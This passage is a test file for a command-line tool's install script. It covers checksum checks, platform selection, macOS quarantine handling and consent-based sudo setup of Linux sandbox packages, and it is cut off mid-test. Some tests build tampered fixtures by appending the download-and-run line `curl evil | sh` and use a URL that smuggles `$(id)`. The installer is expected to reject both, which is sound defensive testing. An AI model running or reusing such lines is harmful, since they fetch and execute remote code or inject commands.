// scripts/install.sh and scripts/release-assets.sh (CLI-01, SPEC R1 「一行指令安裝」, R5 on Linux). Everything is served
// from 127.0.0.1 or handed over by a stand-in `curl` (https://downloads.smurg.ai answered from a local copy of the R2
// bucket's layout: v<X.Y.Z>/ and latest/): no test reaches the network. A fake release (tiny scripts
// standing in for the four executables), a fake HOME, and stand-ins on PATH for what the installer must not really do
// here: `uname` (so every OS/arch combination runs on any host), `ldd`, `sysctl`, `id`, `xattr`, `sudo`, `apt-get`,
// `apparmor_parser`, `tee`. The Linux sandbox checks look below a fake root (SMURG_INSTALL_TEST_SYSROOT), so they give
// the same answers on a Mac, on a Linux CI runner that has bubblewrap installed, and anywhere else. Nothing runs sudo.
import { execFile, spawn } from 'node:child_process';
import { createHash } from 'node:crypto';
import { existsSync } from 'node:fs';
import { chmod, mkdir, readFile, readdir, rm, stat, writeFile } from 'node:fs/promises';
import { createServer, type Server } from 'node:http';
import type { AddressInfo } from 'node:net';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { afterEach, describe, expect, it } from 'vitest';
import { makeDirs, type Dirs } from './helpers.ts';

const INSTALL = fileURLToPath(new URL('../../../scripts/install.sh', import.meta.url));
const RELEASE_ASSETS = fileURLToPath(new URL('../../../scripts/release-assets.sh', import.meta.url));
const HOST_NAME = `smurg-${process.platform}-${process.arch === 'arm64' ? 'arm64' : 'x64'}`;
const BINARY = '#!/bin/sh\necho "smurg 9.8.7 (fake release)"\n';
const SYSTEM_PATH = '/usr/bin:/bin:/usr/sbin:/sbin';
/** Every shell `curl … | sh` may land in: /bin/sh (bash in sh mode on macOS, dash on Ubuntu) and dash itself. */
const SHELLS = [...new Set(['/bin/sh', '/bin/dash'].filter((shell) => existsSync(shell)))];

interface Target {
  readonly name: string;
  readonly uname: readonly [string, string];
}
const TARGETS: readonly Target[] = [
  { name: 'smurg-darwin-arm64', uname: ['Darwin', 'arm64'] },
  { name: 'smurg-darwin-x64', uname: ['Darwin', 'x86_64'] },
  { name: 'smurg-linux-x64', uname: ['Linux', 'x86_64'] },
  { name: 'smurg-linux-arm64', uname: ['Linux', 'aarch64'] },
];
const APPARMOR_PROFILE = 'abi <abi/4.0>,\ninclude <tunables/global>\nprofile smurg-bwrap /usr/bin/bwrap flags=(unconfined) {\n  userns,\n}\n';

/** A stand-in executable for one target: says which one it is, and logs that it ran (after the install checks). */
const fakeBinary = (name: string): string => `#!/bin/sh\n[ -z "\${FAKE_LOG:-}" ] || echo "run ${name} $*" >>"$FAKE_LOG"\necho "smurg 9.8.7 (fake ${name})"\n`;

const cleanups: (() => Promise<void> | void)[] = [];
afterEach(async () => {
  while (cleanups.length > 0) await Promise.resolve((cleanups.pop() as () => Promise<void> | void)()).catch(() => {});
});

interface Release {
  readonly base: string;
  readonly requests: string[];
}

async function serve(files: Record<string, string>): Promise<Release> {
  const requests: string[] = [];
  const server: Server = createServer((req, res) => {
    requests.push(req.url ?? '');
    const body = files[(req.url ?? '').replace(/^\/r1\//, '')];
    if (body === undefined) {
      res.writeHead(404).end();
      return;
    }
    res.writeHead(200, { 'content-type': 'application/octet-stream' }).end(body);
  });
  await new Promise<void>((resolve) => server.listen({ host: '127.0.0.1', port: 0 }, resolve));
  cleanups.push(() => new Promise<void>((resolve) => server.close(() => resolve())));
  return { base: `http://127.0.0.1:${(server.address() as AddressInfo).port}/r1`, requests };
}

interface Run {
  readonly code: number;
  readonly out: string;
}

function install(dirs: Dirs, args: readonly string[]): Promise<Run> {
  return new Promise((resolve) => {
    execFile('/bin/sh', [INSTALL, ...args], { env: { PATH: SYSTEM_PATH, HOME: dirs.home }, timeout: 60_000 }, (err, stdout, stderr) => {
      resolve({ code: err ? (typeof err.code === 'number' ? err.code : 1) : 0, out: `${stdout}${stderr}` });
    });
  });
}

/** Runs `shell <args>` with exactly this environment, optionally feeding stdin (as `curl … | sh` does). */
function runShell(shell: string, args: readonly string[], env: Record<string, string>, stdin?: string): Promise<Run> {
  return new Promise((resolve, reject) => {
    const child = spawn(shell, args, { env, stdio: ['pipe', 'pipe', 'pipe'] });
    let out = '';
    child.stdout.on('data', (chunk: Buffer) => (out += chunk.toString('utf8')));
    child.stderr.on('data', (chunk: Buffer) => (out += chunk.toString('utf8')));
    const timer = setTimeout(() => child.kill('SIGKILL'), 60_000);
    child.once('error', reject);
    child.once('close', (code) => {
      clearTimeout(timer);
      resolve({ code: code ?? 1, out });
    });
    child.stdin.end(stdin ?? '');
  });
}

const sha = (text: string): string => createHash('sha256').update(text).digest('hex');

async function setup(): Promise<Dirs> {
  const dirs = await makeDirs();
  cleanups.push(() => dirs.cleanup());
  return dirs;
}

async function writeExecutable(path: string, text: string): Promise<void> {
  await mkdir(dirname(path), { recursive: true });
  await writeFile(path, text);
  await chmod(path, 0o755);
}

/** The stand-ins the installer finds first on PATH. Each one logs its call to $FAKE_LOG. */
async function fakeTools(dir: string): Promise<string> {
  const bin = join(dir, 'fakebin');
  const log = 'echo "$(basename "$0") $*" >>"$FAKE_LOG"';
  await writeExecutable(join(bin, 'uname'), `#!/bin/sh\ncase "$1" in\n  -s) echo "$FAKE_UNAME_S" ;;\n  -m) echo "$FAKE_UNAME_M" ;;\n  *) exec /usr/bin/uname "$@" ;;\nesac\n`);
  await writeExecutable(
    join(bin, 'ldd'),
    `#!/bin/sh\nif [ "\${FAKE_MUSL:-0}" = 1 ]; then echo 'musl libc (x86_64)' >&2; echo 'Version 1.2.4' >&2; exit 1; fi\necho 'ldd (Ubuntu GLIBC 2.39-0ubuntu8) 2.39'\n`,
  );
  await writeExecutable(join(bin, 'sysctl'), `#!/bin/sh\n${log}\n[ -n "\${FAKE_TRANSLATED:-}" ] || { echo "sysctl: unknown oid '$2'" >&2; exit 1; }\necho "$FAKE_TRANSLATED"\n`);
  // Never root here unless a test says so (FAKE_UID=0), whoever runs the tests: the root branch would run apt-get and
  // tee directly (their stand-ins below only log "UNEXPECTED direct").
  await writeExecutable(join(bin, 'id'), `#!/bin/sh\n[ "$1" = -u ] && { echo "\${FAKE_UID:-1000}"; exit 0; }\nexec /usr/bin/id "$@"\n`);
  // runuser -u USER -- CMD…: logged, then CMD runs with FAKE_AS_USER=USER (a stand-in bwrap can then act as the
  // unprivileged user the AppArmor restriction applies to).
  await writeExecutable(join(bin, 'runuser'), `#!/bin/sh\n${log}\n[ "$1" = -u ] || exit 2\nuser="$2"; shift 2; [ "$1" = -- ] && shift\nFAKE_AS_USER="$user" exec "$@"\n`);
  await writeExecutable(
    join(bin, 'xattr'),
    `#!/bin/sh\n${log}\ncase "$1" in\n  -p) [ "\${FAKE_QUARANTINE:-0}" = 1 ] && { echo '0081;00000000;Safari;'; exit 0; }; echo "xattr: $3: No such xattr: $2" >&2; exit 1 ;;\n  -d) exit 0 ;;\nesac\nexit 2\n`,
  );
  // sudo: logged, never run. `sudo tee FILE` keeps what it was given in $FAKE_TEE_OUT instead of writing FILE.
  await writeExecutable(
    join(bin, 'sudo'),
    `#!/bin/sh\n${log}\nif [ "$1" = tee ]; then cat >"$FAKE_TEE_OUT"; fi\nif [ "$1 $2" = "apt-get install" ]; then exit "\${FAKE_APT_EXIT:-0}"; fi\nexit 0\n`,
  );
  for (const tool of ['apt-get', 'apparmor_parser', 'tee']) await writeExecutable(join(bin, tool), `#!/bin/sh\necho "UNEXPECTED direct $(basename "$0") $*" >>"$FAKE_LOG"\nexit 99\n`);
  return bin;
}

interface Sysroot {
  readonly tools?: readonly string[];
  readonly restricted?: '0' | '1';
  readonly profile?: boolean;
  /** The body of the stand-in /usr/bin/bwrap (default: `exit 0`, a bubblewrap that can create its namespaces). */
  readonly bwrap?: string;
}

/** A fake root for the Linux checks: which tools exist, the AppArmor switch, an existing profile. */
async function fakeSysroot(dir: string, spec: Sysroot): Promise<string> {
  const root = join(dir, 'sysroot');
  await mkdir(root, { recursive: true });
  for (const tool of spec.tools ?? []) {
    const body = tool === 'bwrap' && spec.bwrap !== undefined ? spec.bwrap : 'exit 0';
    await writeExecutable(join(root, tool === 'apparmor_parser' ? 'usr/sbin' : 'usr/bin', tool), `#!/bin/sh\n${body}\n`);
  }
  if (spec.restricted !== undefined) {
    await mkdir(join(root, 'proc/sys/kernel'), { recursive: true });
    await writeFile(join(root, 'proc/sys/kernel/apparmor_restrict_unprivileged_userns'), `${spec.restricted}\n`);
  }
  if (spec.profile) {
    await mkdir(join(root, 'etc/apparmor.d'), { recursive: true });
    await writeFile(join(root, 'etc/apparmor.d/smurg-bwrap'), APPARMOR_PROFILE);
  }
  return root;
}

interface Faked {
  readonly dirs: Dirs;
  readonly env: Record<string, string>;
  readonly log: string;
  readonly prefix: string;
  readonly teeOut: string;
  readonly sysroot: string;
  calls(): Promise<string[]>;
}

async function faked(target: Target, extra: Record<string, string> = {}, sysroot: Sysroot = {}): Promise<Faked> {
  const dirs = await setup();
  const bin = await fakeTools(dirs.home);
  const log = join(dirs.home, 'calls.log');
  await writeFile(log, '');
  const tmp = join(dirs.home, 'tmp');
  await mkdir(tmp, { recursive: true });
  const root = await fakeSysroot(dirs.home, sysroot);
  const teeOut = join(dirs.home, 'tee.out');
  const env = {
    PATH: `${bin}:${SYSTEM_PATH}`,
    HOME: dirs.home,
    TMPDIR: tmp,
    FAKE_LOG: log,
    FAKE_TEE_OUT: teeOut,
    FAKE_UNAME_S: target.uname[0],
    FAKE_UNAME_M: target.uname[1],
    SMURG_INSTALL_TEST_SYSROOT: root,
    ...extra,
  };
  return {
    dirs,
    env,
    log,
    prefix: join(dirs.home, 'opt'),
    teeOut,
    sysroot: root,
    calls: async () => (await readFile(log, 'utf8')).split('\n').filter((line) => line !== ''),
  };
}

/** A release with all four stand-in executables and their SHA256SUMS. */
const fullRelease = (overrides: Record<string, string | undefined> = {}): Record<string, string> => {
  const files: Record<string, string | undefined> = {};
  for (const target of TARGETS) files[target.name] = fakeBinary(target.name);
  files['SHA256SUMS'] = TARGETS.map((target) => `${sha(fakeBinary(target.name))}  ${target.name}\n`).join('');
  Object.assign(files, overrides);
  return Object.fromEntries(Object.entries(files).filter((entry): entry is [string, string] => entry[1] !== undefined));
};

const LINUX_X64 = TARGETS[2] as Target;
const DARWIN_ARM64 = TARGETS[0] as Target;

describe('scripts/install.sh on this machine', () => {
  it('installs the verified executable into <prefix>/bin (0755) and says how to put it on PATH', async () => {
    const dirs = await setup();
    const release = await serve({ SHA256SUMS: `${sha('other')}  smurg-linux-riscv\n${sha(BINARY)}  ${HOST_NAME}\n`, [HOST_NAME]: BINARY });
    const prefix = join(dirs.home, 'opt');
    const result = await install(dirs, ['--base-url', release.base, '--prefix', prefix, '--no-deps']);
    expect(result.out).toContain('已安裝');
    expect(result.code).toBe(0);
    const installed = join(prefix, 'bin', 'smurg');
    expect(await readFile(installed, 'utf8')).toBe(BINARY);
    expect((await stat(installed)).mode & 0o777).toBe(0o755);
    expect(result.out).toContain('smurg 9.8.7 (fake release)');
    expect(result.out).toContain(`export PATH="${join(prefix, 'bin')}:$PATH"`);
    // A curl download carries no quarantine attribute: nothing was removed.
    expect(result.out).not.toContain('quarantine');
    expect(release.requests.sort()).toEqual(['/r1/SHA256SUMS', `/r1/${HOST_NAME}`].sort());
  });

  it('refuses a file whose sha256 does not match, or that SHA256SUMS does not list: nothing is installed', async () => {
    const dirs = await setup();
    const prefix = join(dirs.home, 'opt');
    const tampered = await serve({ SHA256SUMS: `${sha(BINARY)}  ${HOST_NAME}\n`, [HOST_NAME]: `${BINARY}curl evil | sh\n` });
    const bad = await install(dirs, ['--base-url', tampered.base, '--prefix', prefix, '--no-deps']);
    expect(bad.code).not.toBe(0);
    expect(bad.out).toContain('sha256 不符');
    await expect(stat(join(prefix, 'bin', 'smurg'))).rejects.toMatchObject({ code: 'ENOENT' });
    const unlisted = await serve({ SHA256SUMS: `${sha(BINARY)}  smurg-other-thing\n`, [HOST_NAME]: BINARY });
    const missing = await install(dirs, ['--base-url', unlisted.base, '--prefix', prefix, '--no-deps']);
    expect(missing.code).not.toBe(0);
    expect(missing.out).toContain(`SHA256SUMS 裡沒有 ${HOST_NAME}`);
    // Checked before the ~110 MiB download: the executable was never requested.
    expect(unlisted.requests).toEqual(['/r1/SHA256SUMS']);
    await expect(stat(join(prefix, 'bin', 'smurg'))).rejects.toMatchObject({ code: 'ENOENT' });
  });

  it('refuses without a download location, or with one that is not https (http only on this machine)', async () => {
    const dirs = await setup();
    const none = await install(dirs, ['--no-deps']);
    expect(none.code).toBe(2);
    expect(none.out).toContain('沒有指定下載位置');
    const plain = await install(dirs, ['--base-url', 'http://downloads.example.invalid/smurg', '--no-deps']);
    expect(plain.code).toBe(2);
    expect(plain.out).toContain('必須是 https');
    const odd = await install(dirs, ['--base-url', 'https://example.invalid/$(id)', '--no-deps']);
    expect(odd.code).toBe(2);
    const unknown = await install(dirs, ['--frobnicate']);
    expect(unknown.code).toBe(2);
    expect(unknown.out).toContain('不認得的參數 --frobnicate');
  });

  it('works as `curl … | sh`: the script on stdin, the URL from SMURG_INSTALL_BASE_URL, the default prefix ~/.local', async () => {
    const dirs = await setup();
    const release = await serve({ SHA256SUMS: `${sha(BINARY)}  ${HOST_NAME}\n`, [HOST_NAME]: BINARY });
    const script = await readFile(INSTALL, 'utf8');
    for (const shell of SHELLS) {
      const result = await runShell(shell, ['-s', '--', '--no-deps'], { PATH: SYSTEM_PATH, HOME: dirs.home, SMURG_INSTALL_BASE_URL: release.base }, script);
      expect(result.out).toContain('smurg 安裝完成');
      expect(result.code).toBe(0);
      expect(await readFile(join(dirs.home, '.local', 'bin', 'smurg'), 'utf8')).toBe(BINARY);
    }
  });

  it('a download cut short runs nothing: every step is inside main, called on the last line', async () => {
    const dirs = await setup();
    const release = await serve({ SHA256SUMS: `${sha(BINARY)}  ${HOST_NAME}\n`, [HOST_NAME]: BINARY });
    const script = await readFile(INSTALL, 'utf8');
    const lines = script.split('\n');
    const mainCall = lines.lastIndexOf('main "$@"');
    expect(mainCall).toBeGreaterThan(0);
    expect(lines.slice(mainCall + 1).join('').trim()).toBe('');
    for (const cut of [0.25, 0.5, 0.75, 0.999]) {
      const partial = script.slice(0, Math.floor(script.length * cut));
      const result = await runShell('/bin/sh', ['-s'], { PATH: SYSTEM_PATH, HOME: dirs.home, SMURG_INSTALL_BASE_URL: release.base }, partial);
      expect(result.out).not.toContain('smurg 安裝：下載');
    }
    expect(release.requests).toEqual([]);
    expect(existsSync(join(dirs.home, '.local'))).toBe(false);
  });
});

describe('scripts/install.sh picks the executable of every OS / architecture (faked uname)', () => {
  for (const shell of SHELLS) {
    for (const target of TARGETS) {
      it(`${target.uname.join(' ')} → ${target.name} (${shell})`, async () => {
        const f = await faked(target);
        const release = await serve(fullRelease());
        const result = await runShell(shell, [INSTALL, '--base-url', release.base, '--prefix', f.prefix, '--no-deps'], f.env);
        expect(result.out).toContain(`fake ${target.name}`);
        expect(result.code).toBe(0);
        expect(await readFile(join(f.prefix, 'bin', 'smurg'), 'utf8')).toBe(fakeBinary(target.name));
        expect((await stat(join(f.prefix, 'bin', 'smurg'))).mode & 0o777).toBe(0o755);
        expect(release.requests.sort()).toEqual(['/r1/SHA256SUMS', `/r1/${target.name}`].sort());
        const calls = await f.calls();
        if (target.uname[0] === 'Darwin') {
          // The attribute is looked for only after the checksum matched, and is absent: nothing is removed.
          expect(calls.filter((call) => call.startsWith('xattr'))).toEqual([expect.stringMatching(new RegExp(`^xattr -p com\\.apple\\.quarantine .*/${target.name}$`))]);
          expect(result.out).not.toContain('quarantine');
        } else {
          expect(calls.some((call) => call.startsWith('xattr'))).toBe(false);
        }
        expect(calls.some((call) => call.startsWith('sudo'))).toBe(false);
      });
    }
  }

  it('an x86_64 shell under Rosetta on Apple silicon gets the arm64 executable', async () => {
    const f = await faked(TARGETS[1] as Target, { FAKE_TRANSLATED: '1' });
    const release = await serve(fullRelease());
    const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', f.prefix], f.env);
    expect(result.code).toBe(0);
    expect(await readFile(join(f.prefix, 'bin', 'smurg'), 'utf8')).toBe(fakeBinary('smurg-darwin-arm64'));
  });

  for (const target of TARGETS) {
    it(`refuses a tampered ${target.name} before running it or touching its attributes`, async () => {
      const f = await faked(target, { FAKE_QUARANTINE: '1' });
      const release = await serve(fullRelease({ [target.name]: `${fakeBinary(target.name)}curl evil | sh\n` }));
      const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', f.prefix, '--no-deps'], f.env);
      expect(result.code).not.toBe(0);
      expect(result.out).toContain(`${target.name} 的 sha256 不符`);
      expect(existsSync(join(f.prefix, 'bin'))).toBe(false);
      const calls = await f.calls();
      expect(calls.some((call) => call.startsWith('run ') || call.startsWith('xattr'))).toBe(false);
    });
  }

  it('a missing asset is a clear error, nothing installed: the executable of this platform, or SHA256SUMS', async () => {
    const f = await faked(TARGETS[3] as Target);
    const noBinary = await serve(fullRelease({ 'smurg-linux-arm64': undefined }));
    const result = await runShell('/bin/sh', [INSTALL, '--base-url', noBinary.base, '--prefix', f.prefix, '--no-deps'], f.env);
    expect(result.code).not.toBe(0);
    expect(result.out).toContain(`無法下載 ${noBinary.base}/smurg-linux-arm64（這個平台的執行檔不在發佈裡，或網路中斷），不安裝`);
    expect(existsSync(join(f.prefix, 'bin'))).toBe(false);
    const noSums = await serve(fullRelease({ SHA256SUMS: undefined }));
    const sums = await runShell('/bin/sh', [INSTALL, '--base-url', noSums.base, '--prefix', f.prefix, '--no-deps'], f.env);
    expect(sums.code).not.toBe(0);
    expect(sums.out).toContain(`無法下載 ${noSums.base}/SHA256SUMS`);
    expect(noSums.requests).toEqual(['/r1/SHA256SUMS']);
    expect(existsSync(join(f.prefix, 'bin'))).toBe(false);
  });

  it('refuses an OS, an architecture or a C library it has no executable for, before downloading anything', async () => {
    const release = await serve(fullRelease());
    const cases: [Target, Record<string, string>, string][] = [
      [{ name: '-', uname: ['FreeBSD', 'amd64'] }, {}, '不支援這個作業系統：FreeBSD'],
      [{ name: '-', uname: ['Linux', 'riscv64'] }, {}, '不支援這個處理器架構：riscv64'],
      [LINUX_X64, { FAKE_MUSL: '1' }, 'musl'],
    ];
    for (const [target, extra, message] of cases) {
      const f = await faked(target, extra);
      const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', f.prefix], f.env);
      expect(result.code).not.toBe(0);
      expect(result.out).toContain(message);
    }
    expect(release.requests).toEqual([]);
  });

  it('an executable that does not run here is not installed, and says why', async () => {
    const f = await faked(LINUX_X64);
    const broken = '#!/bin/sh\necho "error while loading shared libraries: libstdc++.so.6" >&2\nexit 127\n';
    const release = await serve(fullRelease({ 'smurg-linux-x64': broken, SHA256SUMS: `${sha(broken)}  smurg-linux-x64\n` }));
    const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', f.prefix, '--no-deps'], f.env);
    expect(result.code).not.toBe(0);
    expect(result.out).toContain('libstdc++.so.6');
    expect(result.out).toContain('無法在這台電腦上執行');
    expect(existsSync(join(f.prefix, 'bin'))).toBe(false);
  });
});

describe('scripts/install.sh on macOS: com.apple.quarantine', () => {
  it('removes the attribute only after the checksum matched, and before the executable first runs', async () => {
    const f = await faked(DARWIN_ARM64, { FAKE_QUARANTINE: '1' });
    const release = await serve(fullRelease());
    const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', f.prefix], f.env);
    expect(result.code).toBe(0);
    const calls = await f.calls();
    const query = calls.findIndex((call) => /^xattr -p com\.apple\.quarantine .*\/smurg-darwin-arm64$/.test(call));
    const removal = calls.findIndex((call) => /^xattr -d com\.apple\.quarantine .*\/smurg-darwin-arm64$/.test(call));
    const firstRun = calls.findIndex((call) => call.startsWith('run smurg-darwin-arm64'));
    expect(query).toBeGreaterThanOrEqual(0);
    expect(removal).toBeGreaterThan(query);
    expect(firstRun).toBeGreaterThan(removal);
    expect(result.out).toContain('已移除下載檔案的 com.apple.quarantine 屬性');
  });

  it.skipIf(process.platform !== 'darwin')('with the real xattr: a quarantined download is installed without the attribute', async () => {
    const dirs = await setup();
    const bin = join(dirs.home, 'fakebin');
    // curl as usual, then the file gets the attribute a browser download would carry.
    await writeExecutable(
      join(bin, 'curl'),
      `#!/bin/sh\n/usr/bin/curl "$@" || exit $?\nout=''; prev=''\nfor a in "$@"; do [ "$prev" = -o ] && out="$a"; prev="$a"; done\ncase "$out" in */smurg-darwin-*) /usr/bin/xattr -w com.apple.quarantine '0081;00000000;Safari;' "$out" ;; esac\n`,
    );
    const release = await serve({ SHA256SUMS: `${sha(BINARY)}  ${HOST_NAME}\n`, [HOST_NAME]: BINARY });
    const prefix = join(dirs.home, 'opt');
    const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', prefix], { PATH: `${bin}:${SYSTEM_PATH}`, HOME: dirs.home });
    expect(result.code).toBe(0);
    expect(result.out).toContain('已移除下載檔案的 com.apple.quarantine 屬性');
    const check = await runShell('/usr/bin/xattr', ['-p', 'com.apple.quarantine', join(prefix, 'bin', 'smurg')], { PATH: SYSTEM_PATH });
    expect(check.code).not.toBe(0);
  });
});

describe('scripts/install.sh on Linux: the guest sandbox needs, with consent only', () => {
  const missingAll: Sysroot = { tools: ['apt-get', 'apparmor_parser'], restricted: '1' };

  it('without a terminal and without --yes it asks nobody and runs no sudo: it prints the commands', async () => {
    const f = await faked(LINUX_X64, {}, missingAll);
    const release = await serve(fullRelease());
    const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', f.prefix], f.env);
    expect(result.code).toBe(0);
    expect(result.out).toContain('客人沙盒需要的套件還沒安裝：bubblewrap socat ripgrep');
    expect(result.out).toContain('sudo apt-get install bubblewrap socat ripgrep');
    expect(result.out).toContain('sudo apparmor_parser -r /etc/apparmor.d/smurg-bwrap');
    expect(result.out).toContain('profile smurg-bwrap /usr/bin/bwrap flags=(unconfined)');
    expect(result.out).toContain('客人沙盒需要的套件：還沒安裝');
    expect(result.out).toContain('AppArmor：還沒處理');
    const calls = await f.calls();
    expect(calls.filter((call) => /^(sudo|UNEXPECTED)/.test(call))).toEqual([]);
    expect(existsSync(f.teeOut)).toBe(false);
  });

  it('with --yes it installs the packages and the AppArmor profile through sudo, and says so', async () => {
    const f = await faked(LINUX_X64, {}, missingAll);
    const release = await serve(fullRelease());
    const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', f.prefix, '--yes'], f.env);
    expect(result.code).toBe(0);
    const calls = await f.calls();
    expect(calls.filter((call) => /^(sudo|UNEXPECTED)/.test(call))).toEqual([
      'sudo apt-get update -qq',
      'sudo apt-get install -y bubblewrap socat ripgrep',
      'sudo tee /etc/apparmor.d/smurg-bwrap',
      'sudo apparmor_parser -r /etc/apparmor.d/smurg-bwrap',
    ]);
    expect(await readFile(f.teeOut, 'utf8')).toBe(APPARMOR_PROFILE);
    expect(result.out).toContain('客人沙盒需要的套件：已安裝：bubblewrap socat ripgrep');
    expect(result.out).toContain('AppArmor：已安裝 /etc/apparmor.d/smurg-bwrap');
    // Only the real root is written by sudo; the fake root stays as it was.
    expect(existsSync(join(f.sysroot, 'etc'))).toBe(false);
  });

  it('asks for nothing that is already there, and a failed apt-get is reported without failing the install', async () => {
    const ready = await faked(LINUX_X64, {}, { tools: ['bwrap', 'socat', 'rg', 'apt-get', 'apparmor_parser'], restricted: '1', profile: true });
    const release = await serve(fullRelease());
    const done = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', ready.prefix, '--yes'], ready.env);
    expect(done.code).toBe(0);
    expect(done.out).toContain('客人沙盒需要的套件：已經有 bubblewrap、socat、ripgrep');
    expect(done.out).toContain('AppArmor：已生效（bubblewrap 可以建立客人沙盒）');
    expect((await ready.calls()).filter((call) => /^(sudo|UNEXPECTED)/.test(call))).toEqual([]);

    const open = await faked(LINUX_X64, { FAKE_APT_EXIT: '100' }, { tools: ['bwrap', 'apt-get'], restricted: '0' });
    const failed = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', open.prefix, '--yes'], open.env);
    expect(failed.code).toBe(0);
    expect(failed.out).toContain('套件安裝失敗，請自行安裝：sudo apt-get install socat ripgrep');
    expect(failed.out).toContain('AppArmor：不需要');
    expect((await open.calls()).filter((call) => /^(sudo|UNEXPECTED)/.test(call))).toEqual(['sudo apt-get update -qq', 'sudo apt-get install -y socat ripgrep']);
  });

  // review linux-binary F4: the AppArmor step is decided by what bubblewrap can do (the daemon's own probe), not by
  // whether /etc/apparmor.d/smurg-bwrap exists: a profile file that is not loaded left bubblewrap blocked while the
  // installer said 「已經有」 and offered nothing.
  const blockedUntilInstalled = 'if [ -s "$FAKE_TEE_OUT" ]; then exit 0; fi; echo "bwrap: loopback: Failed RTM_NEWADDR: Operation not permitted" >&2; exit 1';
  const withProfileFile = (bwrap: string): Sysroot => ({ tools: ['bwrap', 'socat', 'rg', 'apt-get', 'apparmor_parser'], restricted: '1', profile: true, bwrap });

  it('a profile file that is there but not in effect (bubblewrap still refused) is not taken for done: the fix is printed, and installed with consent', async () => {
    const release = await serve(fullRelease());
    const asked = await faked(LINUX_X64, {}, withProfileFile(blockedUntilInstalled));
    const printed = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', asked.prefix], asked.env);
    expect(printed.code).toBe(0);
    expect(printed.out).toContain('/etc/apparmor.d/smurg-bwrap 已經存在，但沒有生效');
    expect(printed.out).toContain('sudo apparmor_parser -r /etc/apparmor.d/smurg-bwrap');
    expect(printed.out).toContain('AppArmor：還沒處理');
    expect((await asked.calls()).filter((call) => /^(sudo|UNEXPECTED)/.test(call))).toEqual([]);

    const yes = await faked(LINUX_X64, {}, withProfileFile(blockedUntilInstalled));
    const fixed = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', yes.prefix, '--yes'], yes.env);
    expect(fixed.code).toBe(0);
    expect((await yes.calls()).filter((call) => /^(sudo|UNEXPECTED)/.test(call))).toEqual(['sudo tee /etc/apparmor.d/smurg-bwrap', 'sudo apparmor_parser -r /etc/apparmor.d/smurg-bwrap']);
    expect(await readFile(yes.teeOut, 'utf8')).toBe(APPARMOR_PROFILE);
    expect(fixed.out).toContain('AppArmor：已安裝 /etc/apparmor.d/smurg-bwrap（只放寬 /usr/bin/bwrap）');
  });

  it('run as root (sudo sh install.sh) the probe runs as the user sudo came from, else nobody: root\'s own bubblewrap passes without the profile, which is not proof (review RV-5)', async () => {
    const release = await serve(fullRelease());
    // A bubblewrap without the profile: refused for an unprivileged user, fine for root.
    const rootOnly = 'if [ -n "${FAKE_AS_USER:-}" ]; then echo "bwrap: loopback: Failed RTM_NEWADDR: Operation not permitted" >&2; exit 1; fi; exit 0';
    const sysroot: Sysroot = { tools: ['bwrap', 'socat', 'rg', 'apparmor_parser'], restricted: '1', bwrap: rootOnly };
    for (const [env, user] of [
      [{ FAKE_UID: '0', SUDO_USER: 'alice' }, 'alice'],
      [{ FAKE_UID: '0' }, 'nobody'],
      [{ FAKE_UID: '0', SUDO_USER: 'root' }, 'nobody'],
    ] as const) {
      const f = await faked(LINUX_X64, env, sysroot);
      const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', f.prefix], f.env);
      expect(result.code, user).toBe(0);
      expect(result.out, user).toContain('AppArmor：還沒處理');
      expect(result.out, user).not.toContain('已生效');
      expect(result.out, user).toContain('sudo apparmor_parser -r /etc/apparmor.d/smurg-bwrap');
      expect((await f.calls()).filter((call) => call.startsWith('runuser')), user).toEqual([`runuser -u ${user} -- ${f.sysroot}/usr/bin/bwrap --unshare-user --unshare-net --ro-bind / / -- /bin/true`]);
      expect((await f.calls()).filter((call) => /^(sudo|UNEXPECTED)/.test(call)), user).toEqual([]);
    }
    // With the profile in effect the user's bubblewrap works too: then it is.
    const loaded = await faked(LINUX_X64, { FAKE_UID: '0', SUDO_USER: 'alice' }, { ...sysroot, bwrap: 'exit 0' });
    const ok = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', loaded.prefix], loaded.env);
    expect(ok.out).toContain('AppArmor：已生效');
  });

  it('a bubblewrap that fails for another reason is not blamed on AppArmor; without bubblewrap the file alone is reported as unconfirmed', async () => {
    const release = await serve(fullRelease());
    const other = await faked(LINUX_X64, {}, withProfileFile('echo "bwrap: execvp /bin/true: No such file or directory" >&2; exit 1'));
    const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', other.prefix, '--yes'], other.env);
    expect(result.code).toBe(0);
    expect(result.out).toContain('AppArmor：無法確認（bubblewrap：bwrap: execvp /bin/true: No such file or directory；smurg host 會再檢查）');
    expect((await other.calls()).filter((call) => /^(sudo|UNEXPECTED)/.test(call))).toEqual([]);

    const noBwrap = await faked(LINUX_X64, {}, { tools: ['socat', 'rg', 'apparmor_parser'], restricted: '1', profile: true });
    const checked = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', noBwrap.prefix], noBwrap.env);
    expect(checked.code).toBe(0);
    expect(checked.out).toContain('AppArmor：已經有 /etc/apparmor.d/smurg-bwrap（還沒有 bubblewrap 可以確認是否生效；smurg host 會檢查）');
  });

  it('--no-deps checks nothing', async () => {
    const f = await faked(LINUX_X64, {}, missingAll);
    const release = await serve(fullRelease());
    const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', f.prefix, '--no-deps', '--yes'], f.env);
    expect(result.code).toBe(0);
    expect(result.out).toContain('沒有檢查（--no-deps）');
    expect((await f.calls()).filter((call) => /^(sudo|UNEXPECTED)/.test(call))).toEqual([]);
  });
});

describe('scripts/install.sh: how to put the executable on PATH', () => {
  it('names the profile of the person’s shell, and says nothing when the directory is already on PATH', async () => {
    const release = await serve(fullRelease());
